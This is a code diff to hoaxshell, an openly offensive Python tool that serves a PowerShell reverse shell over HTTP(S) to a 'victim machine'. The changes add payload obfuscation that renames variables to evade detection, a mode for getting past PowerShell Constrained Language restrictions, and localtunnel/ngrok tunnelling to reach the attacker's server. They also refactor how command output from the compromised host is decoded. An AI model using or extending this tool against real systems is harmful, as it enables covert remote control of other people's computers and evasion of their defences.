@@ -1,10 +1,10 @@
 #!/bin/python3
 #
-# Written by Panagiotis Chartas (t3l3machus)
+# Author: Panagiotis Chartas (t3l3machus)
 # https://github.com/t3l3machus
 
 from http.server import HTTPServer, BaseHTTPRequestHandler
-import ssl, sys, argparse, base64, readline, uuid, re
+import ssl, sys, argparse, base64, gnureadline, uuid, re
 from os import system, path
 from warnings import filterwarnings
 from datetime import date, datetime
@@ -14,6 +14,8 @@ from time import sleep
 from ipaddress import ip_address
 from subprocess import check_output, Popen, PIPE
 from string import ascii_uppercase, ascii_lowercase
+from platform import system as get_system_type
+from random import randint
 
 filterwarnings("ignore", category = DeprecationWarning)
 
@@ -27,12 +29,21 @@ RED = '\033[1;31m'
 END = '\033[0m'
 BOLD = '\033[1m'
 
+
 ''' MSG Prefixes '''
 INFO = f'{MAIN}Info{END}'
 WARN = f'{ORANGE}Warning{END}'
 IMPORTANT = WARN = f'{ORANGE}Important{END}'
 FAILED = f'{RED}Fail{END}'
 DEBUG = f'{ORANGE}Debug{END}'
+
+# Enable ansi escape characters
+def chill():
+	pass
+
+WINDOWS = True if get_system_type() == 'Windows' else False
+system('') if WINDOWS else chill()
+
 
 # -------------- Arguments & Usage -------------- #
 parser = argparse.ArgumentParser(
@@ -64,7 +75,7 @@ Usage examples:
   
      sudo python3 hoaxshell.py -s <your.domain.com> -t -c </path/to/cert.pem> -k <path/to/key.pem>
 
-  - Encrypted shell session with a tunneling tools:
+  - Encrypted shell session with reverse proxy tunneling tools:
   
      sudo python3 hoaxshell.py -lt 
 
@@ -85,9 +96,11 @@ parser.add_argument("-i", "--invoke-restmethod", action="store_true", help = "Ge
 parser.add_argument("-H", "--Header", action="store", help = "Hoaxshell utilizes a non-standard header to transfer the session id between requests. A random name is given to that header by default. Use this option to set a custom header name.")
 parser.add_argument("-x", "--exec-outfile", action="store", help = "Provide a filename (absolute path) on the victim machine to write and execute commands from instead of using \"Invoke-Expression\". The path better be quoted. Be careful when using special chars in the path (e.g. $env:USERNAME) as they must be properly escaped. See usage examples for details. CAUTION: you won't be able to change directory with this method. Your commands must include ablsolute paths to files etc.")
 parser.add_argument("-r", "--raw-payload", action="store_true", help = "Generate raw payload instead of base64 encoded.")
+parser.add_argument("-o", "--obfuscate", action="store_true", help = "Obfuscate generated payload.")
 parser.add_argument("-v", "--server-version", action="store", help = "Provide a value for the \"Server\" response header (default: Apache/2.4.1)")
 parser.add_argument("-g", "--grab", action="store_true", help = "Attempts to restore a live session (default: false).")
 parser.add_argument("-t", "--trusted-domain", action="store_true", help = "If you own a domain, use this option to generate a shorter and less detectable https payload by providing your DN with -s along with a trusted certificate (-c cert.pem -k privkey.pem). See usage examples for more details.")
+parser.add_argument("-cm", "--constraint-mode", action="store_true", help="Generate a payload that works even if the victim is configured to run PS in Constraint Language mode. By using this option, you sacrifice a bit of your reverse shell's stdout decoding accuracy.")
 parser.add_argument("-lt", "--localtunnel", action="store_true", help="Generate Payload with localtunnel")
 parser.add_argument("-ng", "--ngrok", action="store_true",help="Generate Payload with Ngrok")
 parser.add_argument("-u", "--update", action="store_true", help = "Pull the latest version from the original repo.")
@@ -204,11 +217,6 @@ def checkPulse(stop_event):
 		sleep(5)
 
 
-
-def chill():
-	pass
-
-
 # ------------------ Settings ------------------ #
 prompt = "hoaxshell > "
 quiet = True if args.quiet else False
@@ -220,7 +228,7 @@ t_process = None
 def rst_prompt(force_rst = False, prompt = prompt, prefix = '\r'):
 
 	if Hoaxshell.rst_promt_required or force_rst:
-		sys.stdout.write(prefix + prompt + readline.get_line_buffer())
+		sys.stdout.write(prefix + prompt + gnureadline.get_line_buffer())
 		Hoaxshell.rst_promt_required = False
 
 
@@ -231,7 +239,7 @@ class Tunneling:
 
 		'''Initialization of Tunnel Process'''
 
-		localtunnel = ['lt', '-p', str(port)]
+		localtunnel = ['lt', '-p', str(port), '-l', '127.0.0.1']
 		ngrok = ['ngrok', 'http', str(port), '--log', 'stdout']
 
 		if args.ngrok:
@@ -285,7 +293,8 @@ class Tunneling:
 					break
 
 				elif 'url=' in output:
-					output = output.split('url=https://')[-1]
+					#output = output.split('url=https://')[-1]
+					output = url = re.compile(r".*url=(http|https):\/\/(.*)").findall(output)[0][1]
 					return output
 
 		except Exception as ex:
@@ -308,14 +317,60 @@ class Hoaxshell(BaseHTTPRequestHandler):
 	command_pool = []
 	execution_verified = False
 	last_received = ''
-	verify = str(uuid.uuid4()).replace("-", "")[0:8]
-	get_cmd = str(uuid.uuid4()).replace("-", "")[0:8]
-	post_res = str(uuid.uuid4()).replace("-", "")[0:8]
+	verify = str(uuid.uuid4())[0:8]
+	get_cmd = str(uuid.uuid4())[0:8]
+	post_res = str(uuid.uuid4())[0:8]
 	hid = str(uuid.uuid4()).split("-")
 	header_id = f'X-{hid[0][0:4]}-{hid[1]}' if not args.Header else args.Header
 	SESSIONID = '-'.join([verify, get_cmd, post_res])
 	server_version = 'Apache/2.4.1' if not args.server_version else args.server_version
 	init_dir = None
+	
+	
+	def cmd_output_interpreter(self, output, constraint_mode = False):
+		
+		global prompt
+		
+		try:
+			
+			if constraint_mode:
+				output = output.decode('utf-8', 'ignore')
+				
+			else:
+				bin_output = output.decode('utf-8').split(' ')
+				to_b_numbers = [ int(n) for n in bin_output ]
+				b_array = bytearray(to_b_numbers)
+				output = b_array.decode('utf-8', 'ignore')
+				
+			tmp = output.rsplit("Path", 1)
+			output = tmp[0]
+			junk = True if re.search("Provider     : Microsoft.PowerShell.Core", output) else False
+			output = output.rsplit("Drive", 1)[0] if junk else output
+			
+			if Hoaxshell.init_dir == None:
+				p = tmp[-1].strip().rsplit("\n")[-1]
+				p = p.replace(":", "", 1).strip() if p.count(":") > 1 else p
+				Hoaxshell.init_dir = p
+										
+			if not args.exec_outfile:						
+				p = tmp[-1].strip().rsplit("\n")[-1]
+				p = p.replace(":", "", 1).strip() if p.count(":") > 1 else p
+				
+			else:
+				p = Hoaxshell.init_dir
+				
+			prompt = f"PS {p} > "
+
+		except UnicodeDecodeError:
+			print(f'[{WARN}] Decoding data to UTF-8 failed. Printing raw data.')
+
+		if isinstance(output, bytes):
+			return str(output)
+
+		else:
+			output = output.strip() + '\n' if output.strip() != '' else output.strip()
+			return output
+	
 
 
 	def do_GET(self):
@@ -365,7 +420,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 			session_check.daemon = True
 			session_check.start()
 			print(f'\r[{GREEN}Shell{END}] {BOLD}Payload execution verified!{END}')
-			print(f'\r[{GREEN}Shell{END}] {BOLD}Stabilizing command prompt...{END}') #end = ''
+			print(f'\r[{GREEN}Shell{END}] {BOLD}Stabilizing command prompt...{END}', end = '\n\n') #end = ''
 			print(f'\r[{IMPORTANT}] You can\'t change dir while utilizing --exec-outfile (-x) option. Your commands must include absolute paths to files, etc.') if args.exec_outfile else chill()
 			Hoaxshell.prompt_ready = False
 			Hoaxshell.command_pool.append(f"echo `r;pwd")
@@ -373,7 +428,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 
 		# Grab cmd
-		if self.path == f'/{Hoaxshell.get_cmd}' and legit and Hoaxshell.execution_verified:
+		elif self.path == f'/{Hoaxshell.get_cmd}' and legit and Hoaxshell.execution_verified:
 
 			self.send_response(200)
 			self.send_header('Content-type', 'text/javascript; charset=UTF-8')
@@ -389,6 +444,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 			Hoaxshell.last_received = timestamp
 
+
 		else:
 			self.send_response(200)
 			self.end_headers()
@@ -398,6 +454,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 
 	def do_POST(self):
+		
 		global prompt
 		timestamp = int(datetime.now().timestamp())
 		Hoaxshell.last_received = timestamp
@@ -415,48 +472,13 @@ class Hoaxshell(BaseHTTPRequestHandler):
 				self.send_header('Content-Type', 'text/plain')
 				self.end_headers()
 				self.wfile.write(b'OK')
-				script = self.headers.get('X-form-script')
 				content_len = int(self.headers.get('Content-Length'))
 				output = self.rfile.read(content_len)
-
-				if output:
-					try:
-						bin_output = output.decode('utf-8').split(' ')
-						to_b_numbers = [ int(n) for n in bin_output ]
-						b_array = bytearray(to_b_numbers)
-						output = b_array.decode('utf-8', 'ignore')
-						tmp = output.rsplit("Path", 1)
-						output = tmp[0]
-						junk = True if re.search("Provider     : Microsoft.PowerShell.Core", output) else False
-						output = output.rsplit("Drive", 1)[0] if junk else output
-						
-						if Hoaxshell.init_dir == None:
-							p = tmp[-1].strip().rsplit("\n")[-1]
-							p = p.replace(":", "", 1).strip() if p.count(":") > 1 else p
-							Hoaxshell.init_dir = p
-													
-						if not args.exec_outfile:						
-							p = tmp[-1].strip().rsplit("\n")[-1]
-							p = p.replace(":", "", 1).strip() if p.count(":") > 1 else p
-							
-						else:
-							p = Hoaxshell.init_dir
-							
-						prompt = f"PS {p} > "
-
-					except UnicodeDecodeError:
-						print(f'[{WARN}] Decoding data to UTF-8 failed. Printing raw data.')
-
-					if isinstance(output, bytes):
-						pass
-
-					else:
-						output = output.strip() + '\n' if output.strip() != '' else output.strip()
-
+				output = Hoaxshell.cmd_output_interpreter(self, output, constraint_mode = args.constraint_mode)
+				
+				if output:				
 					print(f'\r{GREEN}{output}{END}')
 					
-				# ~ else:
-					# ~ print(f'\r{ORANGE}No output.{END}')
 					
 			except ConnectionResetError:
 				print(f'[{FAILED}] There was an error reading the response, most likely because of the size (Content-Length: {self.headers.get("Content-Length")}). Try redirecting the command\'s output to a file and transfering it to your machine.')
@@ -591,7 +613,6 @@ def main():
 			server_port = int(args.port) if args.port else 8080
 
 		# Server IP
-
 		server_ip = f'{args.server_ip}:{server_port}'
 		
 		# Tunneling
@@ -611,7 +632,7 @@ def main():
 			if not t_server:
 				exit_with_msg('Failed to initiate tunnel. Possible cause: You have a tunnel agent session already running in the bg/fg.')				
 				
-
+		# Start http server
 		try:
 			httpd = HTTPServer(('0.0.0.0', server_port), Hoaxshell)
 
@@ -646,7 +667,7 @@ def main():
 			elif args.ngrok:
 				source = open(f'{cwd}/payload_templates/https_payload_ngrok.ps1',
 				              'r') if not args.exec_outfile else open(f'{cwd}/payload_templates/https_payload_ngrok_outfile.ps1', 'r')
-
+				              
 			elif not ssl_support:
 				source = open(f'{cwd}/payload_templates/http_payload.ps1', 'r') if not args.exec_outfile else open(f'{cwd}/payload_templates/http_payload_outfile.ps1', 'r')
 			
@@ -667,6 +688,19 @@ def main():
 
 			if args.exec_outfile:
 				payload = payload.replace("*OUTFILE*", args.exec_outfile)
+			
+			if args.constraint_mode:
+				payload = payload.replace("([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')", "($e+$r)")
+
+			if args.obfuscate:
+				
+				for var in ['$s', '$i', '$p', '$v']:
+					
+					_max = randint(1,5)
+					obf = str(uuid.uuid4())[0:_max]
+					
+					payload = payload.replace(var, f'${obf}')
+			
 			
 			encodePayload(payload) if not args.raw_payload else print(f'{PLOAD}{payload}{END}')
 
